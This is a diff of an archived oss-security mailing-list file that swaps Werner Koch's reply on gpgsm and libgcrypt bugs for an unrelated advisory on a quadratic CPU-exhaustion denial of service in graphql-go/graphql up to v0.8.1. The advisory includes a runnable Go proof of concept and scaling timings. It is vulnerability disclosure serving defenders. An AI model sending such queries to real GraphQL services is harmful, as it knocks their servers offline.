@@ -1,97 +1,113 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/15/2
-Message-ID: <87jyomvoi3.fsf@jacob.g10code.de>
-Date: Tue, 15 Sep 2026 11:43:16 +0200
-From: Werner Koch <wk@...pg.org>
-To: Clemens Lang <cllang@...hat.com>
-Cc: oss-security@...ts.openwall.com,  "Lexi Groves (49016)" <contact@....fail>
-Subject: Re: Retrospective by 'gpg.fail' authors
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/26/16
+Message-ID: <CAK=gNzqFv7qQ7Y6Nw7Na4tJX-oDFFAmOgbhipBuTt_okpCZRmg@mail.gmail.com>
+Date: Wed, 26 Aug 2026 18:22:12 +0200
+From: First name Last name <0x6675636b736f6369617479@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS via per-error full-document rescan (GetLocation)
 Content-Type: text/plain; charset=utf-8
 
-Hi!
+Hello,
 
-On Mon, 14 Sep 2026 21:28, Clemens Lang said:
+This reports an algorithmic-complexity denial-of-service defect in
+github.com/graphql-go/graphql, affecting all released versions up to and
+including the latest, v0.8.1. No fixed version exists. It is
+unauthenticated, network-reachable, triggered purely by attacker-controlled
+query text, and requires no special configuration. Reproduced against the
+published v0.8.1 module fetched from the Go module proxy.
 
-> (1) A RCE in `gpgsm` 2.4.9 when invoked as `gpgsm --debug all --import
-> bad.cert`, with the bad.cert file at [1]. This is apparently a 0-day,
+== Affected ==
 
-Actually in all versions > 2.2 if you use --debug x509.  The result is
-that you get garbled output on stderr.  Using the certificates from
-their Git repo we have not been able to get more than a segv.  That is
-obvious because the DER is used as printf format string.  How it is
-possible to get a an RCE is not clear to me - at least not with the
-sample certificate.  We need a real reproducers.  Maybe the presentation
-used a custom build.  It uses libgcrypt 1.12.4 which is not yet used in
-any binary we released.
-
-This is the fix:
-
-               if (DBG_X509)
--                log_debug(skider, skiderlen, "ski is:");
-+                log_printhex (skider, skiderlen, "ski is:");
-
-We did not used -Wformat-nonliteral which would have caught it due to
-gcc problems and distros requiring -Werror.  There is one other case
-where the wrong log function was used but that only affects a certain
-rare smartcard.  BTW, the debug interface is subject to change at any
-time and should thus not to be used for production.
-
-> (2) An integer underflow followed by a buffer overflow in libgcrypt’s
-> RSASSA-PSS verification discussed in slides 38-45 of [2], fixed in
-> libgcrypt commit 0d64fc2 [3] (also reported by somebody using Claude
-
- CommitDate: Wed Aug 5 14:11:03 2026 +0900
-
-    cipher:rsa: Fix verify RSA PSS verify.
-    
-    * cipher/rsa-common.c (_gcry_rsa_pss_verify): Validate EMLEN, before
-    the allocation.
-    
-    --
-    
-    This issue was found by Anthropic using Claude, and has been reviewed
-    manually by David Korczynski from Ada Logics.
-
-> Code) released in (apparently) libgcrypt 1.12.3 without a CVE
-> assigned. The researcher(s) claim this can be used for RCE from the
-> S/MIME verifier and GnuPG with a 53-bit preimage attack (they don’t
-
-We have no information about this except for the slides.  We have not
-been contacted at all.  But the bug used is anyway public for more than
-a month.  From the orginal bug report:
-
-    Severity (our reading; we defer the final rating to you)
-    --------------------------------------------------------
-    We assess the defect as High: an attacker-controlled out-of-bounds
-    heap write (the content, the write length via the hash algorithm,
-    and the underflow offset via the modulus size are all
-    attacker-chosen) reached from the primary public verification API in
-    a default (non-FIPS) build, before any signature parsing. We want to
-    be candid about the deployment precondition, though: the trigger
-    requires the application to verify against a public key whose size
-    it has not vetted (raw signature/key-import-then-verify flows,
-    protocol messages carrying a key). Major consumers such as GnuPG and
-    GnuTLS reject toy-sized RSA keys before libgcrypt sees them, which
-    limits real-world reach; the practical impact ceiling for those is
-    bounded. We leave the final classification to you.
-
-And our reply:
-
-    In normal use cases, before the call of gcry_pk_verify, the key is
-    validated.  That's my understanding.  Perhaps, we will handle this
-    bug, as a normal bug.  (Please note that GnuPG does not use RSA
-    PSS.)
-
-Fixed in libgcrypt 1.12.3 released 2026-08-26
+  Product:  github.com/graphql-go/graphql
+  Versions: all <= v0.8.1; no fix available
+  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
+  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)
 
 
+== Details ==
 
-Shalom-Salam,
+The helper language/location.GetLocation converts a byte offset to a
+line/column for error messages. On every call it recompiles a regexp and
+rescans the ENTIRE source document from the beginning to locate line breaks:
 
-   Werner
+    func GetLocation(s *source.Source, position int) SourceLocation {
+        ...
+        lineRegexp := regexp.MustCompile("\r\n|[\n\r]")  // recompiled
+every call
+        matches := lineRegexp.FindAllIndex(body, -1)      // rescans whole
+body
+        ...
+    }
 
--- 
-The pioneers of a warless world are the youth that
-refuse military service.             - A. Einstein
+GetLocation is called once per reported error from reportError (invoked by
+nearly every validation rule, once per offending element) and from
+handleFieldError during execution. Each call is O(document_size); N errors
+cost O(N * document_size). Because a query with N invalid elements is
+itself O(N) in size, total cost is O(n^2) in request size. Any rule that
+reports one error per element is a valid trigger.
 
-Download attachment "openpgp-digital-signature.asc" of type "application/pgp-signature" (285 bytes)
+
+== Proof of concept ==
+
+Public API; a trivial one-field schema and a query with many unused
+fragment definitions (each triggers one NoUnusedFragments validation error):
+
+    package main
+
+    import (
+        "fmt"
+        "strings"
+        "github.com/graphql-go/graphql"
+    )
+
+    func main() {
+        queryType := graphql.NewObject(graphql.ObjectConfig{
+            Name:   "Query",
+            Fields: graphql.Fields{"hello": &graphql.Field{Type:
+graphql.String}},
+        })
+        schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query:
+queryType})
+
+        const N = 2000
+        var b strings.Builder
+        b.WriteString("{ hello }\n")
+        for i := 0; i < N; i++ {
+            fmt.Fprintf(&b, "fragment F%d on Query { hello }\n", i)
+        }
+        graphql.Do(graphql.Params{Schema: schema, RequestString:
+b.String()})
+    }
+
+Measured wall-clock against v0.8.1 (clean quadratic scaling, each 2x in
+error count is ~4-5x in time):
+
+    N=500  -> 0.38 s
+    N=1000 -> 1.57 s
+    N=2000 -> 8.49 s
+    N=4000 -> ~38 s   (request ~150 KB)
+
+== Impact ==
+
+A single unauthenticated request of a few hundred KB consumes many seconds
+of server CPU; a small number of concurrent such requests saturates the
+worker pool and denies service. Triggered by ordinary query text over the
+network, no authentication and no special configuration. The same path also
+runs during normal execution (handleFieldError), so a large,
+non-adversarial query in which many nullable fields error pays the same
+quadratic cost.
+
+== Remediation ==
+
+No fixed release exists. Precompute a sorted index of newline byte offsets
+per source.Source once (O(n)), cache it on the Source, and have GetLocation
+binary-search that index (O(log n)) instead of rescanning the whole
+document per call. (Hoisting regexp.MustCompile to a package-level var
+alone is insufficient, it removes recompilation but not the O(n) scan.)
+
+== Credit ==
+
+  William Carrier, independent security researcher.
+
+Sincerely,
+
